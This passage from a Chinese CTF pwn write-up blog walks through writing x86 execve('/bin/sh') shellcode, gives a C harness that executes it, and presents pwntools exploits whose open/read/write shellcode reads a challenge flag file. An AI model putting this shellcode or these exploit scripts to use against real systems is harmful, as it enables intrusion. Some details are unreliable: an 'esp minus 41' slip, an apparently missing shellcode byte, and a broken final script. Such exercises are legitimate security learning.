+<li>和exit()一样<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>我们使用int 0x80的系统调用<span class="bd-box"><h-char class="bd bd-beg"><h-inner>。</h-inner></h-char></span>注意要在eax中包含execve的系统调用号<span class="bd-box"><h-char class="bd bd-end"><h-inner>“</h-inner></h-char></span>11<span class="bd-box"><h-char class="bd bd-beg"><h-inner>”</h-inner></h-char></span></li>
+<li>开始编写shellcode<img src="https://cdn.nlark.com/yuque/0/2023/png/33538857/1680787796550-c18927f6-2f99-4fe2-b27b-aa88bb50ec96.png?x-oss-process=image/resize,w_672,limit_0#averageHue=%23320d27&from=url&id=DFwg7&originHeight=366&originWidth=672&originalType=binary&ratio=1.125&rotation=0&showTitle=false&status=done&style=none&title="></li>
+</ol>
+<p><em>这里讲解下为什么要向堆栈中反省推送<span class="bd-box"><h-char class="bd bd-end"><h-inner>“</h-inner></h-char></span>&#x2F;&#x2F;bin&#x2F;sh<span class="bd-box"><h-char class="bd bd-beg"><h-inner>”</h-inner></h-char><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span></em></p>
+<ol>
+<li><em>我们知道在x86堆栈中是从高地址到弟子之的<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>所以要输入反向的字符串<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>同样因为4的倍数的最短指令会更容易些.</em></li>
+<li><em>&#x2F;bin&#x2F;sh是7个字节的<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>如何将他变为8个字节呢<span class="bd-box"><h-char class="bd bd-beg"><h-inner>？</h-inner></h-char></span>很简单<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>加个&#x2F;就ok了+v&#x3D;<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>因为在linux中<span class="bd-box"><h-char class="bd bd-end"><h-inner>“</h-inner></h-char></span>&#x2F;<span class="bd-box"><h-char class="bd bd-beg"><h-inner>”</h-inner></h-char></span>可以作为占位符而存在</em></li>
+</ol>
+<p>用python来生成hs&#x2F;nib&#x2F;&#x2F;的十六进制位<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span><br />        <img src="https://cdn.nlark.com/yuque/0/2023/png/33538857/1680788040197-821188fb-373c-4d59-ab0c-6d8d1734bee0.png#averageHue=%23310b26&clientId=u83927c19-ae8f-4&from=drop&id=u614e9768&name=825468-20190430095304487-203713640.png&originHeight=51&originWidth=402&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=12751&status=done&style=none&taskId=u18752969-09cb-444f-b3d6-823fcb450c9&title=" alt="825468-20190430095304487-203713640.png"><br />之后将分两半塞入栈中即可</p>
+<ol start="5">
+<li>编译成功后用objdump来进行查看<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span><img src="https://cdn.nlark.com/yuque/0/2023/png/33538857/1680788162364-d1faf623-b73c-4856-96c5-ac9429e0d03d.png#averageHue=%23330d27&clientId=u83927c19-ae8f-4&from=drop&height=324&id=dDnj6&name=825468-20190430095316271-1047240220.png&originHeight=325&originWidth=603&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=112730&status=done&style=none&taskId=u61574c72-a71f-4cfd-9f20-e2ca16d8e9f&title=&width=601" alt="825468-20190430095316271-1047240220.png"></li>
+</ol>
+<p>分享一个提取shellcode的指令<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span></p>
+<pre><code class="bash">objdump -d ./execve-stack|grep &#39;[0-9a-f]:&#39;|grep -v &#39;file&#39;|cut -f2 -d:|cut -f1-6 -d&#39; &#39;|tr -s &#39; &#39;|tr &#39;\t&#39; &#39; &#39;|sed &#39;s/ $//g&#39;|sed &#39;s/ /\\x/g&#39;|paste -d &#39;&#39; -s |sed &#39;s/^/&quot;/&#39;|sed &#39;s/$/&quot;/g&#39;
+</code></pre>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/33538857/1680788320701-7c053631-687a-48bc-ba2e-cafc597edfc0.png#averageHue=%2335112b&clientId=u43f33918-2ac1-4&from=drop&id=u2dc3647e&name=825468-20190430095326448-551648099.png&originHeight=89&originWidth=779&originalType=binary&ratio=1.125&rotation=0&showTitle=false&size=41943&status=done&style=none&taskId=u25b91463-531e-4d57-98f1-08ef5229419&title=" alt="825468-20190430095326448-551648099.png"></p>
+<ol start="6">
+<li>shellcode的验证<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span></li>
+</ol>
+<pre><code class="c">#include&lt;stdio.h&gt;
+#include&lt;string.h&gt;
+unsigned char code[] = \
+&quot;\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80&quot;;
+int main(void)
+&#123;
+  printf(&quot;Shellcode Length:  %d\n&quot;, strlen(code));
+    int (*ret)() = (int(*)())code;
+    ret();
+&#125;
+</code></pre>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/33538857/1680788474581-e9707d7d-618d-4b5d-b7be-cd9c1d4212ae.png#averageHue=%2336112a&clientId=u43f33918-2ac1-4&from=drop&id=u79f08a29&name=825468-20190430095335630-1413036695.png&originHeight=89&originWidth=527&originalType=binary&ratio=1.125&rotation=0&showTitle=false&size=25157&status=done&style=none&taskId=u35c1baa4-25c5-4fea-9616-e09817e3421&title=" alt="825468-20190430095335630-1413036695.png"><br /><strong><em>get shell+v&#x3D;</em></strong><br><a name="XhyTj"></a></p>
+<h3 id="回到本题，结合题目要求，进行shellcode的构造；"><a href="#回到本题，结合题目要求，进行shellcode的构造；" class="headerlink" title="回到本题，结合题目要求，进行shellcode的构造；"></a>回到本题<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>结合题目要求<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>进行shellcode的构造<span class="bd-box"><h-char class="bd bd-beg"><h-inner>；</h-inner></h-char></span></h3><ol>
+<li>open函数的shellcode<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span></li>
+</ol>
+<pre><code class="c">  xor ecx,ecx;
+  xor edx,edx;
+   //初始化//
+  push 0x0;        #字符串以\x00结尾 
+  push 0x67616c66; #flag十六进制
+  mov ebx,esp;     #指向flag的地址&lt;span class=&quot;bd-box&quot;&gt;&lt;h-char class=&quot;bd bd-beg&quot;&gt;&lt;h-inner&gt;，&lt;/h-inner&gt;&lt;/h-char&gt;&lt;/span&gt;进行open
+  mov eax,0x5; 
+  int 0x80;
+</code></pre>
+<p><em>tips<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span>push指令会影响esp寄存器的值<span class="bd-box"><h-char class="bd bd-beg"><h-inner>。</h-inner></h-char></span>push指令首先减少esp的值<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>再将源操作数复制到堆栈<span class="bd-box"><h-char class="bd bd-beg"><h-inner>。</h-inner></h-char></span>如果操作数是16位的<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>则esp减2<span class="bd-box"><h-char class="bd bd-beg"><h-inner>；</h-inner></h-char></span>如果操作数是32位的<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>则esp减41</em></p>
+<ol start="2">
+<li>read函数的shellcode<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span></li>
+</ol>
+<pre><code class="c">mov ebx,0x3;         //文件描述符
+mov ecx, 0x0804A0A0; #直接写到shellcode下面的地址&lt;span class=&quot;bd-box&quot;&gt;&lt;h-char class=&quot;bd bd-beg&quot;&gt;&lt;h-inner&gt;，&lt;/h-inner&gt;&lt;/h-char&gt;&lt;/span&gt;esp指向地址
+mov edx, 0x40;
+mov eax, 0x3;
+int 0x80;
+</code></pre>
+<p><em>tips<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span>0是标准输入<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>1是标准输出<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>2是标准错误<span class="bd-box"><h-char class="bd bd-beg"><h-inner>。</h-inner></h-char></span>这意味着如果此时去打开一个新的文件<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>它的文件描述符是3<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>再打开一个则是4······</em></p>
+<ol start="3">
+<li>write函数的shellcode</li>
+</ol>
+<pre><code class="c">mov ebx, 0x1;
+mov ecx, 0x0804A0A0;
+mov edx, 0x40;
+mov eax, 0x4;
+int 0x80;
+</code></pre>
+<p><a name="t8xMD"></a></p>
+<h3 id="EXP："><a href="#EXP：" class="headerlink" title="EXP："></a><em>EXP<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span></em></h3><pre><code class="python">#!/usr/bin/python
+from pwn import *
+from LibcSearcher import *
+a=process(&quot;orw&quot;)
+elf=ELF(&quot;orw&quot;)
+context(arch=&#39;i386&#39;,os=&#39;linux&#39;,log_level=&#39;debug&#39;)
+
+
+shellcode = asm(&#39;&#39;&#39;
+ xor ecx,ecx;
+ xor edx,edx;
+ push 0x0
+ push 0x67616c66;
+ mov ebx,esp;
+ mov eax,0x5;
+ int 0x80;
+
+ mov ebx,0x3; 
+ mov ecx, 0x0804A0A0;
+ mov edx, 0x40;
+ mov eax, 0x3;
+ int 0x80;
+ 
+ mov ebx, 0x1;
+ mov ecx, 0x0804A0A0;
+ mov edx, 0x40;
+ mov eax, 0x4;
+ int 0x80;
+                  &#39;&#39;&#39;)
+print len(shellcode)
+a.recvuntil(&quot;Give my your shellcode:&quot;)
+payload=shellcode
+
+a.sendline(payload)
+a.interactive()
+</code></pre>
+<p><em>当然<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>这么麻烦的汇编代码也同时做了集成工具处理&#x3D;v&#x3D;<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>但是自己手写下才是最好滴–v&#x3D;</em></p>
+<pre><code class="python">from pwn import *
+context.log_level = &#39;debug&#39;
+elf = ELF(&#39;orw&#39;)
+shellcode = shellcraft.open(&#39;/flag&#39;)
+shellcode += shellcraft.read(&#39;eax&#39;,&#39;esp&#39;,100)
+shellcode += shellcraft.write(1,&#39;esp&#39;,100)
+shellcode = asm(shellcode)
+r.sendline(shellcode)
+
+r.interactive()q
+</code></pre>
+<p>周六周天接着上次组会把格式化字符串重新复盘下儿<span class="bd-box"><h-char class="bd bd-beg"><h-inner>。</h-inner></h-char></span></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="../%E7%AE%80%E8%AE%B0%E5%BD%95%E6%A0%88%E8%BF%81%E7%A7%BB%E5%AD%A6%E4%B9%A0%E9%80%94%E4%B8%AD%E5%A4%8D%E4%B9%A0%E6%B1%87%E7%BC%96%E7%9A%84%E6%B5%81%E7%A8%8B/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">
+        
+          简记录栈迁移学习途中复习汇编的流程
+        
+      </div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2023 cy<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a><br>
+      
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="../../../../index.html" class="mobile-nav-link">Home</a>
+  
+    <a href="../../../../archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="../../../../js/clipboard.min.js"></script>
+<script src="../../../../js/jquery-1.4.3.min.js"></script>
+
+<script src="../../../../fancybox/jquery.fancybox-1.3.4.pack.js"></script>
+
+
+<script src="../../../../js/script.js"></script>
+
+
+
+
+
+
+<script>
+  MathJax = {
+    options: {
+      enableMenu: false
+    },
+    tex: {
+      inlineMath: [['$', '$'], ['\\(', '\\)']],
+      displayMath: [['$$', '$$'], ['\\[', '\\]']],
+    }
+  };
+</script>
+<!-- <script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {inlineMath: [['$','$'], ['\\(','\\)']]},
+    CommonHTML: {
+      linebreaks: false
+    }
+  });
+  </script> -->
+<script type="text/javascript" id="MathJax-script" async
+  src="../../../../mathjax/tex-chtml.js">
+</script>
+<!-- <script type="text/javascript"
+   src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.7/MathJax.js?config=TeX-AMS_CHTML">
+</script> -->
+
+
+
+  </div>
+</body>
+</html>
